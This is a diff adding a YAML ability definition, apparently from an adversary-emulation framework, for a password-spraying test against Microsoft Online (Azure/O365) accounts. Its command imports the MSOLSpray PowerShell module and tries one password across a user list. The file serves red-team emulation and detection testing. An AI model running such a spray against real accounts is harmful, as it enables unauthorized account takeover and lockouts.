@@ -1,0 +1,20 @@
+- description: 'This test attempts to brute force a list of Microsoft Online (Azure/O365)
+    users with a single password via the MSOLSpray Powershell module.
+
+    '
+  id: c98d344fed27267f83450731071922aa
+  name: Password Spray Microsoft Online Accounts with MSOLSpray (Azure/O365)
+  platforms:
+    unknown:
+      psh:
+        cleanup: ''
+        command: import-module "$env:temp\MSOLSpray.ps1"; Invoke-MSOLSpray -UserList
+          "$env:temp\T1110.003UserList.txt" -Password "P@ssword1"
+        parsers:
+          plugins.atomic.app.parsers.atomic_powershell:
+          - source: validate_me
+        payloads: []
+  tactic: credential-access
+  technique:
+    attack_id: T1110.003
+    name: 'Brute Force: Password Spraying'
